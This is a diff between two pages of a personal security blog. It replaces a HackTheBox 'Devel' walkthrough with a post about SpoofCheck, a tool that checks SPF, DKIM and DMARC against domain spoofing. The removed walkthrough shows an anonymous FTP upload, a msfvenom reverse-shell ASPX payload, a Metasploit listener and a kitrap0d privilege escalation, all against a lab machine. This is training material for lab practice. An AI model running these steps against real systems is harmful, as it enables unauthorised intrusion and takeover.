@@ -10,8 +10,8 @@
   <head>
     <meta charset="utf-8">
 
-<!-- begin _includes/seo.html --><title>HackTheBox Devel - Dcodezero</title>
-<meta name="description" content="Devel is a retired Windows machine that is rated as Easy on Hack the Box. It is a beginner-level machine which can be completed using publicly available exploits..">
+<!-- begin _includes/seo.html --><title>SpoofCheck.py - Dcodezero</title>
+<meta name="description" content="This tool checks if domain spoofing is possible or not.">
 
 
   <meta name="author" content="DcodeZer0">
@@ -23,32 +23,32 @@
 <meta property="og:type" content="article">
 <meta property="og:locale" content="en_US">
 <meta property="og:site_name" content="Dcodezero">
-<meta property="og:title" content="HackTheBox Devel">
-<meta property="og:url" content="http://localhost:4000/hackthebox/Devel/">
+<meta property="og:title" content="SpoofCheck.py">
+<meta property="og:url" content="http://localhost:4000/tools/spoofcheck/">
 
 
-  <meta property="og:description" content="Devel is a retired Windows machine that is rated as Easy on Hack the Box. It is a beginner-level machine which can be completed using publicly available exploits..">
-
-
-
-  <meta property="og:image" content="http://localhost:4000/assets/img/sample/devel.png">
+  <meta property="og:description" content="This tool checks if domain spoofing is possible or not.">
 
 
 
-
-
-  <meta property="article:published_time" content="2020-03-12T00:00:00+05:30">
+  <meta property="og:image" content="http://localhost:4000/assets/images/sample/spoof-check/spoofing.jpg">
 
 
 
 
 
-  
+  <meta property="article:published_time" content="2024-11-03T00:00:00+05:30">
+
+
+
+
 
   
 
+  
 
-<link rel="canonical" href="http://localhost:4000/hackthebox/Devel/">
+
+<link rel="canonical" href="http://localhost:4000/tools/spoofcheck/">
 
 
 
@@ -187,18 +187,18 @@
 
 
 <div class="page__hero--overlay"
-  style="background-color: #000; background-image: linear-gradient(rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0.75)), url('/assets/img/sample/devel.png');"
+  style="background-color: #000; background-image: linear-gradient(rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0.75)), url('/assets/images/sample/spoof-check/spoofing.jpg');"
 >
   
     <div class="wrapper">
       <h1 id="page-title" class="page__title" itemprop="headline">
         
-          HackTheBox Devel
+          SpoofCheck.py
 
         
       </h1>
       
-        <p class="page__lead">Devel is a retired Windows machine that is rated as Easy on Hack the Box. It is a beginner-level machine which can be completed using publicly available exploits..
+        <p class="page__lead">This tool checks if domain spoofing is possible or not.
 </p>
       
       
@@ -215,13 +215,19 @@
       <span class="page__meta-readtime">
         <i class="far fa-clock" aria-hidden="true"></i>
         
-          4 minute read
+          3 minute read
         
       </span>
     
   </p>
 
 
+      
+        <p>
+        
+          <a href="/hackthebox/Legacy/" class="btn btn--light-outline btn--large">Part 2</a>
+        
+        </p>
       
     </div>
   
@@ -254,7 +260,7 @@
       
         
         <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
-          <a href="/categories/#hackthebox" itemprop="item"><span itemprop="name">Hackthebox</span></a>
+          <a href="/categories/#tools" itemprop="item"><span itemprop="name">Tools</span></a>
           <meta itemprop="position" content="2" />
         </li>
         <span class="sep">/</span>
@@ -262,7 +268,7 @@
     
       
       
-        <li class="current">HackTheBox Devel</li>
+        <li class="current">SpoofCheck.py</li>
       
     
   </ol>
@@ -397,9 +403,9 @@
 
 
   <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
-    <meta itemprop="headline" content="HackTheBox Devel">
-    <meta itemprop="description" content="Devel is a retired Windows machine that is rated as Easy on Hack the Box. It is a beginner-level machine which can be completed using publicly available exploits..">
-    <meta itemprop="datePublished" content="2020-03-12T00:00:00+05:30">
+    <meta itemprop="headline" content="SpoofCheck.py">
+    <meta itemprop="description" content="This tool checks if domain spoofing is possible or not.">
+    <meta itemprop="datePublished" content="2024-11-03T00:00:00+05:30">
     
 
     <div class="page__inner-wrap">
@@ -410,193 +416,162 @@
           <aside class="sidebar__right ">
             <nav class="toc">
               <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
-              <ul class="toc__menu"><li><a href="#lets-get-started">Let’s get started</a></li><li><a href="#as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</a></li><li><a href="#trying-to-upload-a-file-through-ftp">Trying to upload a file through FTP</a></li><li><a href="#generating-payload">Generating Payload</a></li><li><a href="#setting-up-the-listner-in-msfconsole">Setting up the listner in msfconsole</a></li><li><a href="#privilege-escalation">Privilege Escalation</a></li><li><a href="#getting-usertxt">Getting User.txt</a></li><li><a href="#getting-roottxt">Getting Root.txt</a></li></ul>
+              <ul class="toc__menu"><li><a href="#spoofcheck-your-first-line-of-defense-against-email-domain-spoofing">Spoofcheck: Your First Line of Defense Against Email Domain Spoofing</a><ul><li><a href="#introduction">Introduction</a></li><li><a href="#link">link</a></li><li><a href="#what-is-spoofcheck">What is Spoofcheck?</a></li><li><a href="#why-domain-spoofing-matters">Why Domain Spoofing Matters</a><ul><li><a href="#the-real-world-impact">The Real-World Impact</a></li></ul></li><li><a href="#key-features">Key Features</a></li><li><a href="#understanding-email-authentication">Understanding Email Authentication</a><ul><li><a href="#spf-sender-policy-framework">SPF (Sender Policy Framework)</a></li><li><a href="#dkim-domainkeys-identified-mail">DKIM (DomainKeys Identified Mail)</a></li><li><a href="#dmarc-domain-based-message-authentication-reporting-and-conformance">DMARC (Domain-based Message Authentication, Reporting, and Conformance)</a></li></ul></li><li><a href="#best-practices-for-using-spoofcheck">Best Practices for Using Spoofcheck</a><ul><li><a href="#1-regular-testing">1. Regular Testing</a></li><li><a href="#2-response-planning">2. Response Planning</a></li><li><a href="#3-integration-with-security-workflows">3. Integration with Security Workflows</a></li></ul></li><li><a href="#implementation-guide">Implementation Guide</a><ul><li><a href="#getting-started">Getting Started</a></li><li><a href="#common-issues-and-solutions">Common Issues and Solutions</a></li></ul></li><li><a href="#advanced-usage-tips">Advanced Usage Tips</a></li><li><a href="#security-considerations">Security Considerations</a></li><li><a href="#conclusion">Conclusion</a></li><li><a href="#resources-for-further-reading">Resources for Further Reading</a></li></ul></li></ul>
             </nav>
           </aside>
         
-        <h2 id="lets-get-started">Let’s get started</h2>
+        <h1 id="spoofcheck-your-first-line-of-defense-against-email-domain-spoofing">Spoofcheck: Your First Line of Defense Against Email Domain Spoofing</h1>
 
-<h2 id="as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</h2>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-10 11:42 CET
-        Nmap scan report for 10.10.10.5
-        Host is up (0.039s latency).
-        Not shown: 998 filtered ports
-        PORT   STATE SERVICE VERSION
-        21/tcp open  ftp     Microsoft ftpd
-        | ftp-anon: Anonymous FTP login allowed (FTP code 230)
-        | 03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client
-        | 03-17-17  04:37PM                  689 iisstart.htm
-        |_03-17-17  04:37PM               184946 welcome.png
-        | ftp-syst:
-        |_  SYST: Windows_NT
-        80/tcp open  http    Microsoft IIS httpd 7.5
-        | http-methods:
-        |_  Potentially risky methods: TRACE
-        |_http-server-header: Microsoft-IIS/7.5
-        |_http-title: IIS7
-        Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+<h2 id="introduction">Introduction</h2>
+<p>In today’s digital landscape, email security remains a critical concern for organizations of all sizes. Email spoofing attacks, where malicious actors impersonate legitimate domains to conduct phishing campaigns or business email compromise (BEC) attacks, continue to pose a significant threat. Enter Spoofcheck, a powerful open-source tool designed to help security professionals identify and prevent domain spoofing vulnerabilities.</p>
 
-        Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-        Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds
-</code></pre></div></div>
+<h2 id="link">link</h2>
+<p><a href="https://github.com/DcodeZero/Spoofcheck">SpoofCheck.py</a></p>
 
-<p>From the results of <code>NMAP</code> we can see that port <code>21</code> and <code>80</code> are open. The <code>NMAP</code> also says that it’s a <code>ISS 7</code> server.
-So here is the exploit plan, upload an .aspx through ftp, get the reverse shell and escalate the privilege.</p>
+<h2 id="what-is-spoofcheck">What is Spoofcheck?</h2>
+<p>Spoofcheck is a security assessment tool that analyzes domain configurations to determine their vulnerability to email spoofing attempts. By examining various email authentication protocols and security measures, it provides valuable insights into potential security gaps that could be exploited by attackers.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ftp 10.10.10.5
-    Connected to 10.10.10.5.
-    220 Microsoft FTP Service
-    Name (10.10.10.5:ech0): anonymous
-    331 Anonymous access allowed, send identity (e-mail name) as password.
-    Password:
-    230 User logged in.
-    Remote system type is Windows_NT.
+<h2 id="why-domain-spoofing-matters">Why Domain Spoofing Matters</h2>
+<h3 id="the-real-world-impact">The Real-World Impact</h3>
+<p>Email spoofing can lead to several serious consequences:</p>
+<ul>
+  <li>Financial losses through BEC attacks</li>
+  <li>Damage to brand reputation</li>
+  <li>Loss of customer trust</li>
+  <li>Data breaches through successful phishing attempts</li>
+  <li>Regulatory compliance issues</li>
+</ul>
 
-    ftp&gt; dir
-    200 PORT command successful.
-    125 Data connection already open; Transfer starting.
-    03-18-17  01:06AM       IR&gt;          aspnet_client
-    03-17-17  04:37PM                  689 iisstart.htm
-    03-17-17  04:37PM               184946 welcome.png
-    226 Transfer complete.
-</code></pre></div></div>
+<h2 id="key-features">Key Features</h2>
+<p>Spoofcheck helps organizations by:</p>
+<ul>
+  <li>Identifying missing or misconfigured email authentication records</li>
+  <li>Detecting vulnerabilities in domain configurations</li>
+  <li>Providing actionable insights for security improvements</li>
+  <li>Offering a simple way to verify email security posture</li>
+</ul>
 
-<h2 id="trying-to-upload-a-file-through-ftp">Trying to upload a file through <code>FTP</code></h2>
+<h2 id="understanding-email-authentication">Understanding Email Authentication</h2>
+<p>To appreciate Spoofcheck’s importance, it’s crucial to understand the key email authentication protocols it examines:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ftp&gt; put test.html
-    200 PORT command successful.
-    125 Data connection already open; Transfer starting.
-    226 Transfer complete.
-    16 bytes sent in 0.000144 seconds (114 kbytes/s)
-</code></pre></div></div>
+<h3 id="spf-sender-policy-framework">SPF (Sender Policy Framework)</h3>
+<p>SPF records specify which mail servers are authorized to send emails on behalf of your domain. Proper SPF configuration is essential for:</p>
+<ul>
+  <li>Preventing unauthorized email sending</li>
+  <li>Reducing spam from your domain</li>
+  <li>Improving email deliverability</li>
+</ul>
 
-<p>As we can see that <code>FTP</code> file trasfer is successful.</p>
+<h3 id="dkim-domainkeys-identified-mail">DKIM (DomainKeys Identified Mail)</h3>
+<p>DKIM adds a digital signature to emails, ensuring:</p>
+<ul>
+  <li>Message integrity</li>
+  <li>Sender authentication</li>
+  <li>Protection against tampering</li>
+</ul>
 
-<h2 id="generating-payload">Generating Payload</h2>
+<h3 id="dmarc-domain-based-message-authentication-reporting-and-conformance">DMARC (Domain-based Message Authentication, Reporting, and Conformance)</h3>
+<p>DMARC builds upon SPF and DKIM by:</p>
+<ul>
+  <li>Providing clear policies for handling authentication failures</li>
+  <li>Offering reporting capabilities</li>
+  <li>Enabling domain-wide email protection</li>
+</ul>
 
-<p>I’m using <code>msfvenom</code> to generate the reverse shell payload.</p>
+<h2 id="best-practices-for-using-spoofcheck">Best Practices for Using Spoofcheck</h2>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=5566 -f aspx &gt; shell.aspx
+<h3 id="1-regular-testing">1. Regular Testing</h3>
+<ul>
+  <li>Conduct monthly security assessments</li>
+  <li>Test after any DNS changes</li>
+  <li>Verify configurations across all subdomains</li>
+</ul>
 
-    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-    [-] No arch selected, selecting arch: x86 from the payload
-    No encoder or badchars specified, outputting raw payload
-    Payload size: 341 bytes
-    Final size of aspx file: 2824 bytes
-</code></pre></div></div>
+<h3 id="2-response-planning">2. Response Planning</h3>
+<ul>
+  <li>Document findings and vulnerabilities</li>
+  <li>Develop remediation plans</li>
+  <li>Implement security improvements promptly</li>
+</ul>
 
-<p>As the Payload has been successfully generated, It’s time to upload the file to the victim machine via <code>FTP</code>.</p>
+<h3 id="3-integration-with-security-workflows">3. Integration with Security Workflows</h3>
+<ul>
+  <li>Include in security audits</li>
+  <li>Add to penetration testing procedures</li>
+  <li>Incorporate into compliance checks</li>
+</ul>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ftp&gt; put shell.aspx
-    200 PORT command successful.
-    125 Data connection already open; Transfer starting.
-    226 Transfer complete.
-    2860 bytes sent in 0.000315 seconds (8.66 Mbytes/s)
-</code></pre></div></div>
+<h2 id="implementation-guide">Implementation Guide</h2>
 
-<h2 id="setting-up-the-listner-in-msfconsole">Setting up the listner in msfconsole</h2>
+<h3 id="getting-started">Getting Started</h3>
+<ol>
+  <li>Install the tool</li>
+  <li>Configure your testing environment</li>
+  <li>Run initial domain checks</li>
+  <li>Review and analyze results</li>
+  <li>Implement necessary changes</li>
+</ol>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    msf5 &gt; use exploit/multi/handler
+<h3 id="common-issues-and-solutions">Common Issues and Solutions</h3>
 
-    msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
-    payload =&gt; windows/meterpreter/reverse_tcp
+<table>
+  <thead>
+    <tr>
+      <th>Issue</th>
+      <th>Impact</th>
+      <th>Solution</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Missing SPF Record</td>
+      <td>High</td>
+      <td>Create and implement SPF record</td>
+    </tr>
+    <tr>
+      <td>Weak DMARC Policy</td>
+      <td>Medium</td>
+      <td>Strengthen DMARC policy settings</td>
+    </tr>
+    <tr>
+      <td>Incomplete DKIM</td>
+      <td>High</td>
+      <td>Configure DKIM signing for all mail streams</td>
+    </tr>
+  </tbody>
+</table>
 
-    msf5 exploit(multi/handler) &gt; set LHOST tun0
-    LHOST =&gt; 10.10.*.*
+<h2 id="advanced-usage-tips">Advanced Usage Tips</h2>
+<ul>
+  <li>Automate regular checks</li>
+  <li>Monitor for configuration changes</li>
+  <li>Integrate with existing security tools</li>
+  <li>Track improvements over time</li>
+</ul>
 
-    msf5 exploit(multi/handler) &gt; set LPORT 5566
-    LPORT =&gt; 9001
+<h2 id="security-considerations">Security Considerations</h2>
+<p>When using Spoofcheck, remember to:</p>
+<ul>
+  <li>Keep the tool updated</li>
+  <li>Use in conjunction with other security measures</li>
+  <li>Follow security best practices</li>
+  <li>Document all findings and changes</li>
+</ul>
 
-    msf5 exploit(multi/handler) &gt; show options
+<h2 id="conclusion">Conclusion</h2>
+<p>In an era where email-based attacks are becoming increasingly sophisticated, tools like Spoofcheck play a crucial role in maintaining robust email security. By regularly assessing your domain’s vulnerability to spoofing attempts, you can protect your organization from potentially devastating attacks and maintain the trust of your stakeholders.</p>
 
-    Module options (exploit/multi/handler):
+<h2 id="resources-for-further-reading">Resources for Further Reading</h2>
+<ul>
+  <li>Email Authentication Standards Documentation</li>
+  <li>Anti-Phishing Working Group Guidelines</li>
+  <li>NIST Email Security Recommendations</li>
+  <li>Industry Best Practices for Email Security</li>
+</ul>
 
-    Name  Current Setting  Required  Description
-    ----  ---------------  --------  -----------
+<hr />
 
-    Payload options (windows/meterpreter/reverse_tcp):
-
-    Name      Current Setting  Required  Description
-    ----      ---------------  --------  -----------
-    EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
-    LHOST     tun0      yes       The listen address (an interface may be specified)
-    LPORT     5566             yes       The listen port
-
-    Exploit target:
-
-    Id  Name
-    --  ----
-    0   Wildcard Target
-</code></pre></div></div>
-
-<p>Running the exploit command and opening the <code>shell.aspx</code> in the browser, gave me a meterpreter session</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    msf5 exploit(multi/handler) &gt; exploit
-
-    [*] Started reverse TCP handler on 10.10.*.*:5566
-    [*] Sending stage (180291 bytes) to 10.10.10.5
-    [*] Meterpreter session 1 opened (10.10.*.*:5566 -&gt; 10.10.10.5:49158) 
-
-    meterpreter &gt; getuid
-    Server username: IIS APPPOOL\Web
-</code></pre></div></div>
-
-<p>As seeing the UID, we need to escalate our privileges to gain NT/Authority.</p>
-
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-
-<p>For this part we need a exploit suggester, so I went with a Exploit Suggester module <code>use post/multi/recon/local_exploit_suggester</code> from metasploit.</p>
-
-<p>After the run of Exploit Suggester, I used  <code>exploit/windows/local/ms10_015_kitrap0d</code> for PE.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    meterpreter &gt; background
-    [*] Backgrounding session 1...
-    msf5 exploit(multi/handler) &gt;
-
-    msf5 exploit(multi/handler) &gt; use exploit/windows/local/ms10_015_kitrap0d
-
-    msf5 exploit(windows/local/ms10_015_kitrap0d) &gt; set session 1
-    session =&gt; 1
-
-    msf5 exploit(windows/local/ms10_015_kitrap0d) &gt; set lhost tun0
-    lhost =&gt; tun0
-
-    msf5 exploit(windows/local/ms10_015_kitrap0d) &gt; set lport 5577
-    lport =&gt; 557
-
-    msf5 exploit(windows/local/ms10_015_kitrap0d) &gt; exploit
-
-    [*] Started reverse TCP handler on tun0:5577
-    [*] Launching notepad to host the exploit...
-    [+] Process 3372 launched.
-    [*] Reflectively injecting the exploit DLL into 3372...
-    [*] Injecting exploit into 3372 ...
-    [*] Exploit injected. Injecting payload into 3372...
-    [*] Payload injected. Executing exploit...
-    [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
-    [*] Sending stage (179779 bytes) to 10.10.10.5
-    [*] Meterpreter session 2 opened (10.10.*.*:5577 -&gt; 10.10.10.5:49159)
-
-    meterpreter &gt; getuid
-    Server username: NT AUTHORITY\SYSTEM
-</code></pre></div></div>
-
-<h2 id="getting-usertxt">Getting User.txt</h2>
-
-<p>c:\Users\babis\Desktop&gt; type user.txt
-<br />
-<strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong></p>
-
-<h2 id="getting-roottxt">Getting Root.txt</h2>
-
-<p>c:\Users\Administrator\Desktop&gt; type root.txt
-<br />
-<strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong></p>
-
-<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.</p>
-
-<p>My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>
-
+<p><em>Remember: Email security is not a one-time task but an ongoing process. Regular assessment and updates are key to maintaining strong protection against spoofing attempts.</em></p>
 
         
       </section>
@@ -632,9 +607,9 @@ So here is the exploit plan, upload an .aspx through ftp, get the reverse shell 
     <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
     <span itemprop="keywords">
     
-      <a href="/tags/#metasploit" class="page__taxonomy-item p-category" rel="tag">metasploit</a><span class="sep">, </span>
+      <a href="/tags/#go-lang" class="page__taxonomy-item p-category" rel="tag">Go-lang</a><span class="sep">, </span>
     
-      <a href="/tags/#windows" class="page__taxonomy-item p-category" rel="tag">windows,</a>
+      <a href="/tags/#python" class="page__taxonomy-item p-category" rel="tag">python,</a>
     
     </span>
   </p>
@@ -651,7 +626,7 @@ So here is the exploit plan, upload an .aspx through ftp, get the reverse shell 
     <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
     <span itemprop="keywords">
     
-      <a href="/categories/#hackthebox" class="page__taxonomy-item p-category" rel="tag">hackthebox</a>
+      <a href="/categories/#tools" class="page__taxonomy-item p-category" rel="tag">tools</a>
     
     </span>
   </p>
@@ -659,7 +634,7 @@ So here is the exploit plan, upload an .aspx through ftp, get the reverse shell 
 
         
 
-  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2020-03-12T00:00:00+05:30">March 12, 2020</time></p>
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2024-11-03T00:00:00+05:30">November 3, 2024</time></p>
 
       </footer>
       <section class="page__share">
@@ -667,23 +642,22 @@ So here is the exploit plan, upload an .aspx through ftp, get the reverse shell 
     <h4 class="page__share-title">Share on</h4>
   
 
-  <a href="https://twitter.com/intent/tweet?text=HackTheBox+Devel%20http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2FDevel%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+  <a href="https://twitter.com/intent/tweet?text=SpoofCheck.py%20http%3A%2F%2Flocalhost%3A4000%2Ftools%2Fspoofcheck%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
 
-  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2FDevel%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Ftools%2Fspoofcheck%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
 
-  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4000/hackthebox/Devel/" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4000/tools/spoofcheck/" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
 </section>
 
 
       
   <nav class="pagination">
     
-      <a href="/hackthebox/Blue/" class="pagination--pager" title="HackTheBox Blue
+      <a href="/tools/HTML-Obfuscator/" class="pagination--pager" title="HTML-Obfuscator
 ">Previous</a>
     
     
-      <a href="/hackthebox/Lame/" class="pagination--pager" title="HackTheBox Lame
-">Next</a>
+      <a href="#" class="pagination--pager disabled">Next</a>
     
   </nav>
 
@@ -700,51 +674,6 @@ So here is the exploit plan, upload an .aspx through ftp, get the reverse shell 
   
   <h2 class="page__related-title">You may also enjoy</h2>
   <div class="grid__wrapper">
-    
-      
-      
-
-
-
-<div class="grid__item">
-  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
-    
-      <div class="archive__item-teaser">
-        <img src="/assets/images/sample/spoof-check/spoofing.jpg" alt="">
-      </div>
-    
-    <h2 class="archive__item-title no_toc" itemprop="headline">
-      
-        <a href="/tools/spoofcheck/" rel="permalink">SpoofCheck.py
-</a>
-      
-    </h2>
-    
-
-  <p class="page__meta">
-    
-
-    
-
-    
-      
-      
-
-      <span class="page__meta-readtime">
-        <i class="far fa-clock" aria-hidden="true"></i>
-        
-          4 minute read
-        
-      </span>
-    
-  </p>
-
-
-    <p class="archive__item-excerpt" itemprop="description">This tool checks if domain spoofing is possible or not.
-</p>
-  </article>
-</div>
-
     
       
       
@@ -778,7 +707,7 @@ So here is the exploit plan, upload an .aspx through ftp, get the reverse shell 
       <span class="page__meta-readtime">
         <i class="far fa-clock" aria-hidden="true"></i>
         
-          5 minute read
+          4 minute read
         
       </span>
     
@@ -881,6 +810,50 @@ So here is the exploit plan, upload an .aspx through ftp, get the reverse shell 
 </div>
 
     
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/blackfield/blackfield.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/hackthebox/Blackfield/" rel="permalink">Hackthebox Blackfiled
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          37 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Blackfiled is a HTB active machine at present. This is completely based on enumeration which will lead our way in. This is one of the best windows machine I’...</p>
+  </article>
+</div>
+
+    
   </div>
 </div>
 
@@ -958,8 +931,8 @@ So here is the exploit plan, upload an .aspx through ftp, get the reverse shell 
     
   <script>
     var disqus_config = function () {
-      this.page.url = "http://localhost:4000/hackthebox/Devel/";  /* Replace PAGE_URL with your page's canonical URL variable */
-      this.page.identifier = "/hackthebox/Devel"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
+      this.page.url = "http://localhost:4000/tools/spoofcheck/";  /* Replace PAGE_URL with your page's canonical URL variable */
+      this.page.identifier = "/tools/spoofcheck"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
     };
     (function() { /* DON'T EDIT BELOW THIS LINE */
       var d = document, s = d.createElement('script');
